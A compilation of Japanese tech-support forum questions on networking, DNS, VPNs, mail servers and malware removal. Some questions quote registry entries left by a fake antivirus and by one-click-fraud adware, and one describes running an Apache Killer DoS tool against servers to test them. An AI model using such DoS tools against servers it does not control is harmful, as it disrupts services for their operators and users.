WINDOWS 2008のフォルダに共有設定して、 ゲストアカウントも有効にして、 共有やセキュリティにゲストアカウントを追加して、 ネットワーク上からアクセスしたところ、 ユーザー名とパスワードの入力ダイアログが表示されるPCとされないPCがあります。 されないPCがあるので、サーバ側の設定は正常だとおもうのですが、 完全にユーザー名とパスワードの入力ダイアログを表示しないようにするには どのようにしたらいいのでしょうか？ ちなみにアクセスするPCはwindows系OS全般です。 そしてネットワークパスワードは登録していません。
OS：windows7　Ultimate　32bit　でゾーンアラーム9.2.106.000（英語版）をインストールしました。すでに日本語版が公開されたようですので削除して日本語版に乗り換えようとしたところ削除できません。 思い当たる節としてはTEMPファイルをRディスクにしていしているので削除するときに　Could not load the DLL library R:\Temp\vsutil.dll (Is64Bit). 指定されたプロシージャが見つかりません　←このメッセージがでて削除できません。調べたところ　　http://ameblo.jp/all-freesoft/entry-10545707106. …　　このURLに同じ現象が紹介されていました。vsutil.dll　を取り出してR:\Temp\に入れて削除を試みましたがだめでした！皆様お力をお貸しくださいませ(ｍ　＿　＿)m
メールサーバの無限ループを対策する方法について教えてください。 環境：Linux メールサーバ：sendmail とあるサイトでsendmailで無限ループを対策する方法として ヘッダに識別できるIDなどを追加してループしてるかを判断すると書かれておりました。 この設定はどうのようにすればよいのでしょうか。 m4マクロで形式でヘッダの項目を記入したいとおもってます。 sendmail.cfに直接書くことでヘッダに追加されることは確認しましたが sendmail.mcでの書き方がわかりません。 また、ヘッダに追加した識別IDをどのようにループと判断するように設定すればよいか わかりません、なにか参考になるサイトや設定方法などわかる方教えて頂けますか？
ウィンドウズ７（６４ｂｉｔ）を使っていますが、シャットダウンから、起動した場合にネットワークアダプターが、正常に作動していません。 一度、削除して再起動するか、なにもしないまま、再起動させると、使えるようになります。 ちなみに、ｉｎｔｅｌ（R）　82578DC　Gigabit　Network　Connection　です。 IE8の問題かと思い9にしましたが解決できませんでした。 OSを再インストールすれば、直るかなとも思いましたが、時間がかかりそうで、気がすすみません。 詳しい方がいたら、教えてください。 宜しくお願いいたします。
DHCPでの割り当て範囲として、192.168.1.0/24 を割り当てている状態で、 あるPCのIPアドレスを、DHCPの範囲内で使用されていないIP(例 192.168.1.10)を固定で割り当てた場合、何か問題は発生するでしょうか？ DHCPサーバから、他のPCに192.168.1.10がリースされ、IPが重複してしまうことはあるのでしょうか？
ぜひ皆さんの意見を聞かせてください。 ホットメールで同じメアドを十数年使っています。 ここ最近、PCからログインしていなかったので久しぶりにログインしようとしたところ、 私のメアドで大量の迷惑メールが他の人たちに送られているらしく、アカウントが使えない状態になっていました。 PWを変更することで再ログインはできました。 受信メールでは特に変わったところはなかったのですが、 送信済みのフォルダーをみたら、一日に数十件、知らない人宛に迷惑メールを送信してありました。 メールの内容は数種類ありましたが、すべて英語でかかれてありました。 （でも一部の内容でメープルタウン何ドルとか書いてありました、英語で。） 自分にはまったく覚えがないものです。 これは誰かが私のメアドとPWでログインしてたって事ですよね。 メアドはわかりますが、PWも簡単に他人に知られるものなんでしょうか？ 勝手にログインされたなら気持ち悪いです・・・。 これまで保存してあるメールとかも見られてるだろうし、アドレス帳とかも見られてるのかな・・・。 ずっと同じメアドを使ってきたので、なるべくなら同じメアドを使い続けたいのですが、 PWを変更しただけでは、また同じことをされる可能性もありますよね？ やはり、このメアドは削除して新しく作ったほうがいいのでしょうか？ あと、PWを知られてしまった原因はなんだったのか、 次回から注意するためにも教えていただきたいです。 長文、乱文で失礼いたしました。 よろしくお願いいたします。
お世話になります。 一年程前から、IE、Opera、Chromeなど、ブラウザ問わず、リンクをクリックすると変なサイトに飛ばされるという症状に悩んでおりまして。 Norton、Adaware、Spybotなど最新状態で導入してスキャンしても異常は見つからず、困っていたのですが。 本日、海外サイトで似た症状を見かけ、対処として紹介されていた Malwarebytes' Anti-Malware というソフトを使用してスキャンしてみたところ Trojan. Dnschanger という、悩んでいた症状にぴたりと合うウイルスを発見し、駆除しました。 しかし、駆除後、インターネットにつながらなくなり。ネットワークの修復作業をしてみましたがうまくいかず。 やむなく、復元ポイントを利用して復元しようとしても、最近の復元ポイントのものでは全て失敗するようになりました。 仕方が無いのでAnti-Malwareより、Trojan. Dnschangerを元に戻すとつながるようになりました。 しかしこれでは根本的な解決になりませんので、ウイルスを駆除しつつ、回線を保持（もしくは修復）できる方法があれば教えてください。 なお、OSはWindowsXP SP3、回線はYahoo!BB ADSLです。 常駐ソフトで主なものは、Norton Internet Security2011、Adaware、などです。 よろしくお願いします。
あまりくわしくないので詳しい方いましたら教えて下さい。 携帯やパソコンからホームページにアクセスした場合相手方にこちらのどこまでの情報が流れるのでしょうか？ 相手方にはメールアドレスなんかも漏れてしまうのですか？ 宜しくお願いします。
OpenCloud Securityってウイルスに感染してしまいました。 http://news.loaris.com/ja/opencloud-security-fak …のページの下のほうの OpenCloudセキュリティマニュアルの除去ガイド: で駆除しようとして「APPDATA」のなかのデータは消せたのですが %プログラム％\ OpenCloudセキュリティ\ OpenCloud Security.lnk OpenCloudセキュリティのレジストリエントリを削除します。: HKCR \ exefile \シェル\オープン\コマンド “(デフォルトの)” = ‘C:プログラムのFilesconhost.exe “%1″ %’ HKCU \ソフトウェア\マイクロソフト\ Installer \に製品\ C0AB6693AB3202B4B9D9571 の消し方がわかりません。 「システム設定ユーティリティ」の「スタートアップ」の欄にOpenCloud Securityが まだあるので完全に削除できたわけじゃないと思うのですが どなたか完全駆除の方法を教えていただけませんか。 わかりにくい質問でごめんなさい。
OpenCloud Securityってウイルスに感染してしまいました。 スキャンまでは無料で駆除しようとするとお金がかかる http://news.loaris.com/ja/opencloud-security-fak …などはあったのですが 無料で駆除できる方法はないですか？
本日宿泊しているホテルで無線LANによるインターネット接続サービスがありました。 そこで、接続してみて、Symantecのwebのセキュリティチェックを実施したところ、port1723がopenであるとの警告が表示されました。 私のノートPCの設定としては、Windows7で、パブリックネットワークを選択、Windowsファイアウォールは有効、ウイルスバスター2012導入済み、という状況です。 port1723がどのような設定になっているかホテルに確認しましたが、担当者不在ということで詳細がわかりません。 この状況で、安全にインターネットを使うには、どのような設定に気をつけるべきでしょうか。 ※本日の話なので、ソフトの追加購入等は無理です。 どなたかアドバイス頂けますよう、お願いいたします。
被害に遇われている方々が多いらしく質問させて頂きます。 携帯からのアクセス情報や個人情報、検索履歴やメール送受信内容など携帯を盗聴されてしまっている状態でアドレス変更をしてもメールボックスやサーバに違法な不正アクセスで盗聴されているようです。 携帯端末のセキュリティ対策では防止出来ない範囲ですのでなるべく携帯でのメールや連絡を極力避け使うこともままならないので悩んでおります。 相談窓口で相談しましたが、やはり法的措置を執り被害届を提出した方がよいでしょうか。 携帯会社で調査していただき携帯を点検及び検査して貰った場合は判明出来ますか？ 専門知識に詳しい方、ご回答宜しくお願いします。
現在使っているルーターのDNS参照先をGoogleの8.8.8.8、8.8.4.4に設定していたのですが、DNSキャッシュポイゾニングという攻撃手法を知り、Comodo社が提供している156.154.71.22、156.154.70.22に設定してみました。が、下記の質問スレッド（Comodoの英語フォーラムです）によるとこのDNSアドレスはDNSSECに対応していないようです。 ・http://forums.comodo.com/secure-dns-help-cis/doe … そこで、よりセキュアと言われているDNSSECのキャッシュサーバーのアドレスを設定したいのですが、DNSSECを運用しているキャッシュサーバーのアドレスを教えていただきたいです。自分なりに探してはいるのですが、今のところInfoSphere（http://www.sphere.ne.jp/dnssec/）のアドレスしか見つかっていません。出来れば複数の参照先を確保したいと思っています、よろしくお願いします。
ケータイで興味本意でアダルトサイトの年齢を入れてクリックしたらいきなり登録になってしまいました！なんかErotubeらしいけど無料ではなく有料みたいです！これは悪質なサイトでしょうか？！ちなみにサイト先はhttp://***douga.tv/kagekimovie/なんです。 サイトを開いても解除ボタンがないんです（涙）ちなみにまだ動画とかは見てません！ どうしたら登録解除できるでしょうか？
こんにちは。 下記行いたい事について、どのようなサービス・機器をどのように利用すればいいか わからない事があって、質問させていただきました。 どなたかご存知の方、ご教授いただけると幸いです。 【行いたい事】 業務にて使用目的。 他社クライアント様と、インターネットを介してのデータ共有。 （使用人数は両社で５人（ＰＣ５台）程度） 両社のＩＰ制限をかけたＦＴＰサーバーを用意し、その領域にてデータの受け渡しを 行おうと考えていたが、セキュリティ面からその手法を行うのを断念。 ハードウェアキー（ドングル）を使用した機器・サービスを使用すれば セキュリティの高い運用が可能という事を耳にしたので それはどのようなもので、どのサービス・機器がよいのかというのを調べたのだが よくわからない状態です 【聞きたい事】 ハードウェアキー（ドングル）を使用した機器・サービスで ２社間のＰＣをつないで、データ領域共有ができる機器やサービスは どのようなものなのでしょうか。 ・汎用的（？）なハードウェアキー（ドングル）を使用して、 　ＦＴＰサーバーを準備すればよいのか？ ・ＷＥＢ上のストレージサービスにひもづいた、ハードウェアキー（ドングル） 　なるものがあって、それらを包括したものを利用するようなイメージでしょうか？ よく理解していない状況で質問しており、 何か的外れな文面になっていたら、ご容赦ください。 どうぞよろしくお願いいたします。
よろしくお願いします。私は今ウィルスキラーゼロを入れてネットをしていますがその理由はパソコンのスペックが良くないせいか重いソフトを入れると遅くてとても快適にネット出来る状態ではないので今まで使ったソフトの中でキラーゼロが一番軽かったので今も使っています。 一般的なセキュリティソフトの評価ではあまり評判は良くないようですが私はもう２年ぐらい使っていてウィルス感染したこともないですし少し危ないサイトに入ってもトロイの木馬などをきちっとブロックしてくれた経緯があります。そういう点からいってもキラーゼロでネットしていても問題はないと思っていますがなぜこうも中国製のソフトの評価が良くないのかわかりません。 昔フリーのキングソフトを入れていてクラッシュした経験がありますのでこのソフトが使えないのは良くわかっていますが一般的になぜこうも中国製のソフトの評価が良くないのかがよくわかりません。何故かこの疑問に答えてくれれば幸いです。
Apache Killer対策を要する基準として次の2つがあることがわかりました。 1. Apache2.2.20未満 2. Apache2.0.x しかし、1または2のいずれかに該当しているサイトでも、 巷に出回っているDoSツールを利用して実際に攻撃してみても、 「対象ホストは脆弱性がなさそう」といったメッセージが出力され停止します。 ステータスコード206を応答しないサーバーは「脆弱性がない（だろう）」と 判断しているように思えます。 この場合、アドバイザリに出ている設定ファイルへの追加といった、 暫定的な対応は不用なのでしょうか？ とりわけ、2.0系列は対策済みのパッチがリリースされていないため、 早めにconfファイルへの暫定対応を施したほうがよいのか、 それとも対策版がリリースされてからのアップデートでよいのか 迷っています。 よろしくお願いします。
LINUXのサーバにLANボードを取りつけて使用しておりましたが、この度LANボードが壊れた為、新しいLANボードを取りつけました。 その場合、デバイス名が自動的に新しく作成されるのですが、以前のデバイス名を使用する方法はないのでしょうか？ 例えば、元々eth0とeth1のデバイス名を使用していた場合、新しくLANボードと取りつけた場合eth2が使用されますが、今回の場合すでにeth1のデバイスは壊れたので取り外しました。ですので、新しいLANボードもeth1が使用出来ればと思いますが、このような方法はないのでしょうか？ どなたかよろしくお願いいたします。
はじめまして。 当方、恥ずかしながらアダルトサイトをクリックしてしまい、アダルトサイト請求画面が頻繁に出てしまい、ワンクリウェア駆除ツール を使わせていただきました。 すると以下の画面が表示されました。 確認しましたがパスが記述されていないので削除の必要がないとみて良いでしょうか。 以上、お手数ですが宜しくお願い致します。 『以下のレジストリにパスが記述されていれば削除を推奨 ワンクリサイトからダウンロードしたファイルも残っていれば、削除を推奨。 よくわからなければ、ウイルス対策ソフトが対応するのを待って下さい。 全ファイル＆フォルダの表示設定 higaitaisaku.com http://www.higaitaisaku.com/zenhyoji.html www.ero-filehost.com www.kiss-of-adult.com / www.lady-impact.com [HKEY_CURRENT_USER\Software\Path\D209HF6AFC36E9BA]path [HKEY_CURRENT_USER\Software\Path\D209HF6AFC36E9BA]htmlpath [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]www.kiss-of-adult.com [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run][ProductId]KA [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]www.kiss-of-adult.com.html [HKEY_CURRENT_USER\Software\Path\JUGCGTGSTVSL8TUH]path [HKEY_CURRENT_USER\Software\Path\JUGCGTGSTVSL8TUH]htmlpath [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]www.lady-impact.com.html [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]www.lady-impact.com www.adult-dougaga.com 』
有線から無線に変えたいんですが 環境は整いました。 後はPCでどうするのかと言うことです。 ちなみにWindous7です。 PCで何をどうしたら無線ランにできるのですか？ 教えてください
他の質問サイトも利用させていただきましたが、アドバイスをいただけません・・。どうかよろしくお願いします。 家族のパソコン（WinVista,IE7)ですが、持ち主がプログラムをインストールして良いか悪いのかの判断ができず、数年なにもインストールしないまま放置していたようです。 YouTubeで動画再生のページにいくと、 『この動画を再生するには、Adobe Flash Player が必要です。Adobe からダウンロードしてください。 』 と表示されます。 そこからAdobeのダウンロードページへいき、ダウンロードをクリックすると、《セキュリティの警告》というウインドウが出て、 『現在のセキュリティ設定では、このファイルをダウンロードできません。』 と表示されます。 解決方法を検索してみたところ、 「FlashPlayerのアンインストーラをダウンロードして、Flash Playerを完全に削除する」 という対処法も試してみましたが、こちらもまた、《セキュリティの警告》というウインドウが出て、 『現在のセキュリティ設定では、このファイルをダウンロードできません。』 と表示されました。 セキュリティの設定を変えなければいけないのでしょうか？・・私もパソコンには詳しくないので、どうしたらよいのかわかりません。 どなたかアドバイスをお願いします。
早速ですがご教授ください。 現在、ドメイン (仮にaaa.bbとします) をお名前.comで管理し、Google Appsを利用しています。 そのGoogle Appsと同じドメインにて、別会社のレンタルサーバーを利用し、会社Webサイトを公開しております。(アドレスはwww.aaa.bb) 今回、新たにblog.aaa.bbというアドレスを作成し、同サーバ内でブログサイトを運用したいと考えているのですが、この時のDNSレコーダの設定を教えて下さい。 ※ サーバ会社側のサポートより、サーバ内のユーザ画面からサブドメイン作成できると言うのでが、言われた通りの手順を踏んでもblog.aaa.bbのアドレスにマッピングされません。サポート側にも設定を確認していただきましたが、間違いはなく、もうしばらく待ってみてくれ。と言われて一週間が過ぎます。DNSレコーダ側で直接マッピングできる方法はないかと思い質問いたしました。 ※ www.aaa.bbのアドレスに対するDNSレコーダの設定は下記の通りです。 ホスト名 : www.aaa.bb TYPE : A VALUE : サーバーのIPアドレス
重要な内容のメールを暗号化して送信したいと考えています。 相手のメールソフトはMicrosoft Outlook Express 6なのですが、特に設定をさせずに、暗号化されたメールを読ませる方法はあるのでしょうか？ 難しい場合は、なにか他にやり方はないでしょうか。 相手がど素人なので、手間をかけさせずに情報を送りたいのです。
接続すると ご迷惑をおかけいたしまして大変申し訳ございません。 ただいまサイトは、大変混み合っているか、問題が発生しております。 お手数をおかけいたしまして申し訳ございませんが、 しばらくたってから再度最初からアクセスをお試しいただけますよう、 よろしくお願い申し上げます。 (1315503891.571)　とでます OSはXPSP3　ブラウザはFX　回線は光です セキュリティソフトFWをきっても同じでした サブパソでは見れましたがメインのみみれません・・ サミタのゲームログインは可能でした サミタ以外のHPは問題なくみれます 制限が掛かってるのかとは思うのですが設定の解除の仕方もわかりません アドバイスよろしくお願いします
ハッキングという言葉でよいのか分かりませんが、 映画などを見ると、すぐれたハッカーは簡単に他人のパソコンに侵入できてしまうようで心配です。 私のパソコンにはカメラとマイクが最初から付いていますが、 ハッカーは、映画のように、それを使って覗き見をすることは出来るのでしょうか？ ハードディスクとかを調べらたり出来るものでしょうか？ また、パソコンのパスワードが知られた場合は、 ごく普通のハッカーでも侵入は容易でしょうか？ 私はウイルスソフトでファイヤーウオールを設置していますが、それでも心配です。 以上、よろしくお願い致します。
各セグメントのデフォルトゲートウエイ(ルータ)の変更ができない場合に、他の方法でセグメントの接続は可能でしょうか? 【ネットワークＡ】 <<インターネット>> 　｜ 　｜ [ルータＡ] 　｜192.168.1.1 　｜ [ハブA1] 　｜PC(A11) 192.168.1.11/24, DGW)192.168.1.1 ...他 　： 　： 　｜ [ハブA3] 　　PC(A31) 192.168.1.31/24, DGW)192.168.1.1 ...他 　　 　 【ネットワークＢ】 [ルータＢ] 　｜192.168.10.1 　｜ [ハブB1] 　｜ 　｜ [ハブB2] 　　NAS 192.168.10.21/24, DGW)192.168.10.1 　　PC(B21) 192.168.10.21/24, DGW)192.168.10.1 ...他 ・現状 ネットワークＡとネットワークＢは同じフロアにありますが接続されていません。 ネットワークＡはPCが50台ほど、ネットワークＢはサーバ、NAS、PCが数台接続されています。 ネットワークAは事務処理用で各自I台、インターネットに接続できます。 ネットワークBは管理業務用で担当部署専用で他のネットワークには接続してません。 ・制約事項 ルータＡ、ルータＢは変更できない。 ・目的 ネットワークＡの各PCから、ネットワークＢのNASを共有したい。 ネットワークＢは当面、NASの共有以外は現状のまま閉じた状態としたい。 以上、よろしくお願いします。
ウェブ上のPDFファイルやHTMLファイルは、右クリックなどで保存が出来ないページが有ります。 ウェブ上での公開が終わっても、見られる様に内容を保存したいです。 方法が有れば教えて下さい。
古いノートPCにdebian6をインストールしました。 NICは１枚ですが、USBのNICを使っています。 設定上、eth0とeth1は問題なく認識しています。 eth0はDHCPサーバの役割もしており、eth0から出たケーブルをハブにさし、 そのハブに接続すると、IPアドレスが振られます（クラスA）。 eth1はその先にあるルータ（RTX1200）からIPアドレス（クラスC）をもらっています（DHCPにしていません）。 eth1から出たケーブルをハブにつなぎ、そのハブに接続したPCはインターネットに出られます。 問題はeth0です。 eth0に接続したPCはインターネットに出られません。 ipフォワディングには1を立てているので、出られるはずなのですが…。 ちなみに、インターフェースの再起動やDHCPサーバの再起動などは何度もやっております。 設定として足りないところはあるでしょうか？ 補足情報です。 eth0のDHCPからアドレスをもらったPCはeth1のNICにアドレスに導通が取れます。 その逆もそうです。 しかし、eth1のNICより先（ルータなど）には通りません。 おわかりの方、ぜひともアドバイスをお願いいたします。
Microsoft Network Moniter3.4が、どのようなものか入れてみたのですが、 連続して下のメッセージが表示されていました。 毎秒以上に出ているのですが、PC-Nameには、以前あったPCのPC名が入っており、 現在はそのPCはありません。 気にしなければ、いいのかもしれませんが、裏ではずっと動いている事を考えると 気になってしまいます。 いろいろ調べては見たのですが、私にはわかりませんでした。 何か解決策をご教授いただければ、大変助かるのですが、よろしくお願い致します。 以下に内容 ProcessName部: System Source部: 自PCのIPアドレス ProtcolName部: NbtNs Description部: NbtNs:Query Request for PC-Name <00> <0x00> Workstation Service (NbtNs:Query Request for PC-Name <0x20> File Server Service もあります。）
本店⇔支店の２施設の間での 閉域網を利用したVPNネットワークが先日開通しました。 本店、支店それぞれのPCでファイル共有を希望しています。 各PCの端末はブロードバンドルーターとVPNルーターにHUB分けして接続されており、 デフォルトゲートウェイはインターネットルーターです。 VPNの通信時に経路を変更するように設定しています。 下記が現在のネットワークです。 [ 本店のネットワーク ] ネットワークアドレス：192.168.1.0/24 デフォルトゲートウェイ(ブロードバンドルーター)：192.168.1.1 VPNルーター：192.168.1.254 [ 支店のネットワーク ] ネットワークアドレス：192.168.11.0/24 デフォルトゲートウェイ(ブロードバンドルーター)：192.168.11.1 VPNルーター：192.168.11.254 それぞれのPCから相手先のブロードバンドルーター、VPNルーターへのpingは飛びました。 また、支店のPCから本店のPCの共有ファイルを確認することができました。 しかし、本店から支店の共有ファイルを確認がどうしてもできません。 記載のとおり本店のPCからVPNルーター、ブロードバンドルーターまではpingが飛びますが、 その末端にあるPCにpingが飛ばない状況です。 「Request timed out」となります。 支店にはウィルス対策にキングソフトのフリーソフトを導入していたので、念のために停止し、 ファイアウォールも無効にしましたが同じでした。 支店のブロードバンドルーターは 「WHR-G54S」です。 つたない文章ですが何かアドバイスがあればご教授願います。
CCNAを受験する予定で、都内のITスクールに通っています。 しかし、10月当たりから出題内容が変わると聞いています。 変わる内容はシュミレーション問題（入力形式問題）のようです。 スクールの先生には9月中の受験を勧められています。 自分の日程的には9月中の受験は少し厳しいのですが 10月の受験は可能でしょうか。 できれば余裕を持って10月に受験したいのですが 本当に10月になると本当にガラリと出題傾向が変わってしまうのでしょうか 変わるとしたらどういったところなのでしょうか
添付図の「パターン１」のようなネットワーク構成がうまくいかずに困っています。 以下、具体的な状況と問題です。 ■最終目的 最終的には5セッションの回線2本で10個のプロバイダでPPPoEマルチセッションをしたい ■現在状況 添付図の「パターン２」のように、 ５セッションの回線２本を使って二つのプロバイダにPPPoE接続中(問題なし) ■問題 現在は、添付図の「パターン２」で上手くいっているが、「パターン１」のようにすると上手くいかない ■症状 ・タイムアウトのようになってネットに繋がらなくなる ・ローカルIPでブラウザからルータの設定画面にアクセスできなくなる(「パターン２」では可) ・ただし、PCからルータにPINGは通る ■パターン１にしたい理由 5セッションの回線を使っているが、4セッション対応のルータを使っているため、 将来的には１つの回線を2つのルータに4セッションと１セッションというようにわけて使いたいので 図の「パターン１」のようなことを実現したい。 ■環境 ・5セッションの回線が２つ ・最大4セッションのPPPoE対応のルータbuffalo BBR-4HGが2台 ・ルータの配下のPCは全て相互にローカルIPでアクセス可能したい ・ルータAの設定 IP:192.168.11.1 Subnet:255.255.255.0 ・ルータBの設定 IP:192.168.11.33 Subnet:255.255.255.0 ・PC1の設定 IP:192.168.11.2 Subnet:255.255.255.0 Gateway:192.168.11.1 ・PC2の設定 IP:192.168.11.34 Subnet:255.255.255.0 Gateway:192.168.11.33 付け焼刃の知識でやっている為、何が問題なのか分からずに、困っています。 どうかご教授願います。
OSはWindowsXPのPCにXampp 1.7.3を使ってApacheをインストールし、 セキュリティ設定のために、.htaccessを記述しました。 .htaccessの内容は下記の通り Order deny,allow deny from all allow from localhost しかしその後から 「Access forbidden! 要求されたオブジェクトへのアクセス権がありません」と表示され、アクセスができません。 試しにdeny from allの部分を削除してみるとアクセスできるようになったのですが、 これを消していいものかも分らず困っています。 対処法を教えていただけないでしょうか。 よろしくお願いします。
iPodの事で至急質問です新しいパソコンを買って新しくiTunesをダウンロードしてiPodを接続したらiPodの中の曲が消えてしまいました。 もう戻す事はできませんか? ちなみに前使ってたパソコンは壊れてデータがありません
無線LANの設定にほとほと困り果てております。どなたかお助け願えませんでしょうか・・・ 親機は、BAFFALOの「WHR-G54S」です。ノートPCにはネットワークカード「WLI-CB-G54S」が刺さっておりAOSSで無事に接続できております。 それとは別のPCにUSBの無線子機を接続しようとしていますが、そちらが全くうまくいきません・・・ （そもそもどういう手順で接続すればいいのかよくわからなくて・・・） 子機はCOREGAのCG-WLUSB300NBKを使っています。 この機種だとおそらくセキュリティのAESが使えないためAirStationでWEPに切り替えて13文字を設定しました。 これでセキュリティキーとして子機に入れたところ繋がることはつながるものの制限付きアクセスになりネットの閲覧ができません・・・どこから設定を見なすべきでしょうか？
私は海外サイトなども利用する機会が多いです。プロキシサーバ（VPN）を利用すると悪質サイトなどを知らずに利用してしまった場合などにデータの流出などを防げる可能性が高いと聞きました（もちろん全ての場合ではありませんが。）。 質問１： プロキシサーバ（VPN）を利用している時に商用サイト（Amazon.com、インターネットバンキングサイト等）などでID、Password、クレジットカード等を利用して商品購入・決済や銀行取引をすることは危険ではないのでしょうか（商用サイト以外にもID、Passwordで各ユーザーの情報が保護されているサイトを含みます。例えばOKWave等）？ 私が心配しているのは、プロキシサーバ（VPN）を介してID、Password、クレジットカード等の情報を送信した場合、プロキシサーバを管理している業者に私のそれらの情報を知られてしまわないかということです。 質問2： もしも、ID、Password、クレジットカード等の情報がプロキシサーバ（VPN）を提供している業者に知られないとしても、それでは、どの程度の情報がその業者に知られるのでしょうか？私が訪れたサイトの履歴ぐらいですか？ 質問３： やはり、プロキシサーバ（VPN）を利用するのと利用しないのとでは、利用したほうがセキュリティ面では高くなるのでしょうか？利用すると、具体的にどのような場合にメリットがあるのか今一理解できていません。ご教授ください。 質問4： ここで上げているプロキシサーバ（VPN）は無料のものではなく、海外の業者が有料で提供しているものです。しかし、海外のプロキシサーバを有料で提供している業者で、その業者の所在地や電話番号など企業の詳細情報を公開しているところは少ないですね。探せばなかにはありますが。　なぜですかね？ よろしくお願いします。
こんにちは。 現在Windows7 HE(64bit)を利用しています。現在利用可能なネットワークが2つあります。 1つ目のネットワーク（Aとする）は高速なのですが大学内LANですのでtorrentなどは使用できません。 もう１つ（Bとする）は低速ですが上記のような制限は無いことを確認済みです。（Aは多数の方が使いますがBは基本的に私のみが使うネットワークです。） 仕事柄torrentを利用する機会が多く（Linux系のOSなどをtorrentで共有したりしています）、その際には手動でAを無効にし、Bを利用しています。 しかしただでさえ低速なBですので同時にインターネット等をしようと思うととても遅くて非効率的です。 そこで、torrentソフトではネットワークB、ブラウザーではAを使う（同時に）ような方法はないでしょうか？高速回線Aはブラウザでのみ使えればいいため、Bを通常使うネットワークに設定し、ブラウザのみAにする、などでもかまいません。 ブラウザーはChromeを使っていますが、こだわりはないので場合によっては変えても構いません。 よろしくお願いします。
IE'erというプログラムを使って、IEやOfficeをリモートから起動させられたりパラメータを取得されたりする、という記事を読んで恐ろしいと思い、DCOMをぎりぎりまで制限したいと考えています。 そこでまずレジストリ設定で"EnableDCOM"をNに変更したのですが、他にもローカルセキュリティポリシーのセキュリティオプション内にもDCOMの制限が出来る設定があり、ここでも出来る限りの制限を設けたいと思っています。 …が、Microsoftのページではエクスプローラやサービスが起動しなくなる恐れがあると記載されており、実際適当に拒否にチェックを入れていくとExplorer.exeが起動不能に陥ってしまいます。 インターネット側から、またLAN内の他PCからのDCOM関係の要求は全て制限しつつ、自PC内のエクスプローラやサービスは通常通り使用できるようにするにはどう設定を組み合わせればよいでしょうか？ルータとPFWで135番へのインバウンド接続はシャットアウトしていますが、心配なのでOS側でも適切に遮断したいと考えています。自PCの用途はネットサーフィンとメール程度で、リモートアクセスやNASへのアクセス、サーバーの運用は考えていません。使用OSはWindows7ProfessionalSP1です。 とりあえず自分なりに設定してみた感じだと、 ・コンピュータアクセス制限 ローカルアクセス|リモートアクセス Everyone 許可|拒否 Performance Log Users　拒否|拒否 Distributed COM Users　拒否|拒否 ANONYMOUS LOGON 拒否|拒否 ・コンピュータ起動制限 ローカルからの起動|リモートからの起動|ローカルからのアクティブ化|リモートからのアクティブ化 Everyone　許可|拒否|許可|拒否 Administrators　許可|許可|許可|許可 Performance Log Users　拒否|拒否|拒否|拒否 Distributed COM Users　拒否|拒否|拒否|拒否 こんなところですが、設定に不備があったり、もっと適した設定があれば指摘していただきたいです。 よろしくお願いします。
以下の事象が起きており、事象が事象だけにIdeaPadS10eが原因なのか無線LANアクセスポイントが原因なのかを切り分けられずにおります。 ご教示をお願いしたいのでよろしくお願いします。 【環境】 PR-200NE（ファームウェア16.20）　ルータ兼無線LANアクセスポイント IdeaPadS10e(WindowsXP SP3)　Broadcom802.11gネットワークアダプタ 【症状及び切り分け内容】 1.IdeaPadS10e(WindowsXP SP3)でのみ自宅の無線LANアクセスポイントが表示されない。他の無線アクセスポイントは表示される。 リカバリ実施後、ドライバ及びOSのアップデートを行なったが状況改善せず。ファイアウォールは無効でウイルス対策等のセキュリティソフトは導入していない状態で試しても現象変わらず。 使用してる無線LANアダプタが802.11gのカードのアダプタのため、無線のアクセスポイントの無線LAN動作モードをIEEE802.11g/IEEE802.11b互換から802.11g固定にしたが状況変わらず。 自分のところのアクセスポイントが見つからなかったため、無線LANアダプタを選択して設定を行なったが、無線LANアクセスポイントに接続できず。 PR200NEにて無線LAN簡単セットアップより無線LAN簡単接続（プッシュボタン）を押すが、無線LAN端末の検出は行われず。 他の無線LANアクセスポイントでセキュリティが設定されていない機器に繋がってしまったときに、そのアクセスポイントからインターネットには接続できた。 そのときに、導入されているPC-Doctorというハードウェア診断ツールを使用してテストしたが、ワイヤレスシグナルテスト、ワイヤレス接続テストとも問題なし。 2.他の機器（iPhone、Androidタブレット、PSP、Nintendo　DSi、パソコン（Windows7)からは、自宅の無線LANアクセスポイントに接続できる。 PR-200NEでMACアドレスフィルタリング等のアクセス制限は実施しておらず。
ＬＡＮ内に複数台（２台）のWEBサーバを立てて外部からアクセスさせる場合の ルータのポートフォワーディング（アドレス変換）について。 ※グローバルＩＰアドレスはルータのＷＡＮ側に１個だけ付与されているとします。 以下の図のように ルータの80ポートに着信があったらサーバＡの80ポートにポートフォワーディング。 ルータの8080ポートに着信があったらサーバBの80ポートにポートフォワーディング。 という具合に、ルータ側で着信ポートによってアドレス変換(ポート変換）させるしかないのでしょうか？ ※つまりクライアント側に8080を指定してもらう。 これをTCP80でアクセスしたときに、こちらはサーバＡ　こちらはサーバＢへと 分けるためには、グローバルＩＰアドレスがもう１個いるという問題になるのでしょうか？ 　　 クライアントＡ→TCP(80)　　→ 【ルータ】→【サーバA：８０ポート】+【サーバB：８０ポート】 クライアントＢ→TCP(8080)　 　 　　　 説明が下手ですいません。 よろしくお願いします。
VPS(Win2003Server)上のIIS(6.0)を利用して、メールサーバーを作りたいのですが、リモート先のPC以外からSMTPサーバーに接続できません。 リモート先のPC上にインストールされたThunderbirdでは、POP3、SMTPともに問題なく、メールの送受信ができるのですが、他のネットワークのコンピュータのメールソフトからでは、受信はできても送信ができません。 規定のSMTP仮想サーバーのプロパティは、匿名アクセスと統合Windows認証にチェックがあり、接続制御及び中継の制限は「以下のリストに含まれるコンピュータ以外のすべて」を許可してあり、リストは空です。 ファイアウォールはPOP3、SMTPを除外しており、一時的にファイアウォールを停止させても問題は解決しませんでした。 telnetはリモート先のPC上では正常に接続でき、それ以外では「ホストへ接続できませんでした。ポート番号 smtp: 接続に失敗しました」と表示されます。 SMTPのポートは25で、ポートは開放されているようです。 おそらくセキュリティ上、外部ネットワークからのアクセスを制限しているのだと思いますが、よくあるメールサービスのように、ユーザ名とパスワードがあれば外出先でもメールの送受信ができるようにしたいと考えています。 何を確認し、設定すれば良いのでしょうか？よろしくお願い致します。
